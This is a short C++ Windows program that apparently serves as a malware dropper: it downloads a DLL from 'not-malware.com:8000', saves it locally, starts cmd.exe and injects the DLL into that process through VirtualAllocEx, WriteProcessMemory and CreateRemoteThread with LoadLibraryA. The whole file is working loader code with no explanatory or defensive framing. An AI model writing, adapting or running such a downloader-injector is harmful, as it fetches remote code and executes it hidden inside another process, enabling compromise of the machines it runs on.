#include <windows.h>
#include <wininet.h>
#include <cstdio>

#pragma comment(lib,"wininet")


int main(int argc, char* argv[])
{
    HINTERNET hInternetSession;
    HINTERNET hURL;
    BOOL bResult;
    DWORD dwBytesRead = 1;

    // Make internet connection.
    hInternetSession = InternetOpen(
        L"notmalware", // agent
        INTERNET_OPEN_TYPE_PRECONFIG,  // access
        NULL, NULL, 0);                // defaults

    // Make connection to desired page.
    hURL = InternetOpenUrl(
        hInternetSession,                       // session handle
        L"http://not-malware.com:8000/Dll1.dll",  // URL to access
        NULL, 0, 0, 0);                         // defaults

    // Read page into memory buffer.

    char buf[1024];

    DWORD dwTemp;
    HANDLE hFile = CreateFile(L"Dll1.dll", GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (INVALID_HANDLE_VALUE == hFile) {
        return 0;
    }

    for (;dwBytesRead > 0;)
    {
        InternetReadFile(hURL, buf, (DWORD)sizeof(buf), &dwBytesRead);
        WriteFile(hFile, buf, dwBytesRead, &dwTemp, NULL);
    }

    CloseHandle(hFile);
    STARTUPINFOA SI;
    PROCESS_INFORMATION PI;

    ZeroMemory(&SI, sizeof(SI));
    SI.cb = sizeof(SI);
    ZeroMemory(&PI, sizeof(PI));

    CreateProcessA("C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, TRUE, CREATE_NEW_CONSOLE , nullptr, nullptr, &SI, &PI);
    
    memset(buf, 0, 0x200);
    GetCurrentDirectoryA(0x200, buf);
    strncat_s(buf, "\\Dll1.dll", 10);


    LPVOID pDllPath = VirtualAllocEx(PI.hProcess, 0, 0x200, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(PI.hProcess, pDllPath, (LPVOID)buf, strlen(buf) + 1, 0);
  
    HANDLE hLoadThread = CreateRemoteThread(PI.hProcess, 0, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);

    WaitForSingleObject(hLoadThread, INFINITE); // Wait for the execution of our loader thread to finish

    VirtualFreeEx(PI.hProcess, pDllPath, 0, MEM_RELEASE); // Free the memory allocated for our dll path

    return 0;
}